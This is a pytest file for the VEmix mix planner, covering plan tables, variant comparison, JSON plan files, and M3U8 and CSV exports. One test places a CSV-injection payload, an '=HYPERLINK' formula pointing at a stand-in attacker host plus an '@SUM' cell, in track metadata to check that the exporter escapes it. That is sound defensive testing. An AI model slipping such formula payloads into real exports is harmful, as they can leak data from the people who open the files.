"""VEmix 3.0 plan reports and exports (spec §7–§8): dry-run table, comparison, plan file,
M3U8 / CSV exports, and the FFmpeg-free `compare` command."""

from __future__ import annotations

import copy
import csv
import json
import re
from pathlib import Path

import pytest

from veg_mixer.cli import main
from veg_mixer.plan_report import (
    CSV_COLUMNS,
    PLAN_SCHEMA,
    PlanFileError,
    load_plan_file,
    pick_variant,
    plan_document,
    render_comparison,
    render_plan_text,
    write_plan_csv,
    write_plan_json,
    write_plan_m3u8,
)

from test_dramaturgy import ARC, FAST, pool, run      # noqa: E402  (shared synthetic helpers)


@pytest.fixture(scope="module")
def planned():
    tracks = pool(30)
    data = {**ARC, "anchors": [{"track": "Artist 3 - Song 3", "position": 1}]}
    result, resolved, contexts = run(data, tracks, alternatives=3, settings=FAST)
    return result, tracks


def test_dry_run_table_has_every_required_column(planned):
    result, _ = planned
    text = render_plan_text(result)
    header = next(line for line in text.splitlines() if line.lstrip().startswith("#"))
    for col in ("#", "Phase", "Track", "E", "Tgt", "Dev", "BPM", "Key", "Role", "Trans", "Warnings"):
        assert col in header
    v = result.variants[0]
    rows = [line for line in text.splitlines() if re.match(r"^\s*\d+  \S", line)]
    assert len(rows) == len(v.entries)
    assert "anchor position 1" in rows[0]
    assert "Why each track is here" in text and "from previous: transition" in text
    assert "source durations" in text.lower()                      # the timeline caveat is always printed


def test_comparison_lists_variants_and_tradeoffs(planned):
    result, _ = planned
    text = render_comparison(result)
    for v in result.variants:
        assert f"{v.label} ({v.preset})" in text
    assert "Weighted objective terms" in text and "curve" in text


def test_plan_file_round_trip_and_validation(planned, tmp_path):
    result, tracks = planned
    used = {tid for v in result.variants for tid in v.order}
    by_id = {t.track_id: t for t in tracks if t.track_id in used}
    doc = plan_document(result, folder=tmp_path, recursive=False, tracks=by_id, profile="default",
                        profile_path=None, metadata_path=None, scenario_path=None)
    path = tmp_path / "plan.json"
    write_plan_json(path, doc)
    loaded = load_plan_file(path)
    assert loaded["schema"] == PLAN_SCHEMA and loaded["result"]["variants"][0]["order"] == result.variants[0].order
    assert set(loaded["library"]["tracks"]) == used
    assert pick_variant(loaded, "b")["preset"] == "dramatic"
    assert pick_variant(loaded, "smooth")["label"] == "C"
    with pytest.raises(PlanFileError, match="not in the plan"):
        pick_variant(loaded, "Z")
    bad = tmp_path / "bad.json"
    bad.write_text(json.dumps({"schema": "vegroove.manifest"}), encoding="utf-8")
    with pytest.raises(PlanFileError, match="not a VEmix plan"):
        load_plan_file(bad)
    with pytest.raises(PlanFileError, match="not found"):
        load_plan_file(tmp_path / "missing.json")


def test_m3u8_and_csv_exports(planned, tmp_path):
    result, _ = planned
    v = result.variants[0]
    m3u = tmp_path / "out" / "plan.m3u8"
    write_plan_m3u8(m3u, v, folder=tmp_path / "lib", title="VEmix plan - arc - A")
    lines = m3u.read_text(encoding="utf-8").splitlines()
    assert lines[0] == "#EXTM3U" and lines[1].startswith("#PLAYLIST:")
    assert len(lines) == 2 + 2 * len(v.entries)
    assert lines[3] == f"../lib/{v.entries[0].rel_path}"           # relative to the M3U location
    path = tmp_path / "plan.csv"
    write_plan_csv(path, result.variants)
    raw = path.read_bytes()
    assert raw.startswith(b"\xef\xbb\xbf")                           # BOM: opens in Excel
    rows = list(csv.DictReader(raw.decode("utf-8-sig").splitlines()))
    assert list(rows[0]) == list(CSV_COLUMNS)
    assert len(rows) == sum(len(x.entries) for x in result.variants)
    assert rows[0]["anchored"] == "position 1"


def test_compare_command_needs_no_ffmpeg(planned, tmp_path, monkeypatch, capsys):
    result, tracks = planned
    doc = plan_document(result, folder=tmp_path, recursive=False, tracks={}, profile=None, profile_path=None,
                        metadata_path=None, scenario_path=None)
    path = tmp_path / "plan.json"
    write_plan_json(path, doc)
    monkeypatch.setenv("VEG_FFMPEG", str(tmp_path / "no-such-ffmpeg.exe"))   # FFmpeg unusable on purpose
    assert main(["compare", "--plan", str(path), "--variant", "B"]) == 0
    out = capsys.readouterr().out
    assert "VEmix plan comparison" in out and "variant B (dramatic" in out
    assert main(["compare", "--plan", str(tmp_path / "nope.json")]) == 2


def test_csv_cells_cannot_run_as_spreadsheet_formulas(planned, tmp_path):
    result, _ = planned
    v = copy.deepcopy(result.variants[0])
    v.entries[0].title = '=HYPERLINK("http://evil.invalid/?x","Moonlit Chase")'
    v.entries[0].artist = "@SUM(A1)"
    path = tmp_path / "plan.csv"
    write_plan_csv(path, [v])
    rows = list(csv.DictReader(path.read_bytes().decode("utf-8-sig").splitlines()))
    assert rows[0]["title"].startswith("'=HYPERLINK") and rows[0]["artist"] == "'@SUM(A1)"
    assert all(not r["deviation"].startswith("'") for r in rows)       # numbers stay numbers


def test_comparison_names_the_best_variant_by_severity_then_objective():
    from veg_mixer.dramaturgy import Violation
    from types import SimpleNamespace as NS

    def var(label, objective, *sev):
        return NS(label=label, preset=label.lower(), preset_description="", objective=objective,
                  violations=[Violation("energy_jump", s, None, "x") for s in sev], duration_s=60.0, order=[],
                  stats={}, terms={}, tradeoffs=[])

    r = NS(scenario="s", variants=[var("A", 4.2), var("B", 4.0, 0.05)])
    text = render_comparison(r)
    assert "Best under the scenario weights: variant A" in text and "variant B has the lowest objective" in text
    r = NS(scenario="s", variants=[var("A", 4.0, 0.01, 0.01), var("B", 4.5, 5.0)])
    assert "Best under the scenario weights: variant A" in render_comparison(r)


def test_render_defaults_to_the_variant_plan_showed(planned, tmp_path):
    result, _ = planned
    doc = plan_document(result, folder=tmp_path, recursive=False, tracks={}, profile=None, profile_path=None,
                        metadata_path=None, scenario_path=None, settings={"variant_shown": "B"})
    assert pick_variant(doc, None)["label"] == "B"
    doc["settings"] = {}
    assert pick_variant(doc, None)["label"] == "A"
